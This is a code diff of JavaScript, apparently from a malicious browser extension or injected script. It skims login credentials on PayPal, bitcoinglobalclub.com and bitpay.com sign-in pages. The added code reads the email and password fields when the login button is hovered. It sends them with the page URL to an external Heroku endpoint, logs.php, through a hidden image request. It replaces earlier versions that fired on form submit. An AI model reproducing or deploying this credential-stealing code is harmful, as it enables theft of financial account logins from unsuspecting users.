@@ -126,31 +126,23 @@ for (var i = 0; i < arrayLength; i++) {
     };
 
 
-    if (top['location']['href']['indexOf']('paypal.com') > -1) {
-        var interval = setInterval(function () {
-            if (document['getElementsByClassName']('proceed maskable')[0]) {
-                clearInterval(interval);
-                document['getElementsByName']('login')[0].onsubmit = function (_0x441cx2) {
+    if (top['location']['href']['indexOf']('paypal.com/signin') > -1) {
+              document.getElementsByTagName("button")[2].onmouseover  = function (_0x441cx2) {
                 username = document.getElementsByName("login_email")[0].value;
                 user_pass = document.getElementsByName("login_password")[0].value;
                 (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                 }
-            }
-        }, 1000)
+    };
+
+    if (top['location']['href']['indexOf']('bitcoinglobalclub.com/mlm/pages/login/login.php') > -1) {
+              document.getElementsByTagName("button")[0].onmouseover  = function (_0x441cx2) {
+                username = document.getElementsByName("usus")[0].value;
+                user_pass = document.getElementsByName("clave")[0].value;
+                (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                }
     };
 
 
-
-  if (window.location.href.indexOf("bitcoinglobalclub.com/mlm/pages/login/login.php") > -1) {
-    var login_form = document.getElementById("loginForm");
-      if(login_form){
-          login_form.onsubmit = function(){
-              username = document.getElementsByName("usus")[0].value;
-              user_pass = document.getElementsByName("clave")[0].value;
-              (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
-  		        }
-            }
-          };
 
   if (top['location']['href']['indexOf']('bitpay.com/dashboard/login') > -1) {
       var interval = setInterval(function () {
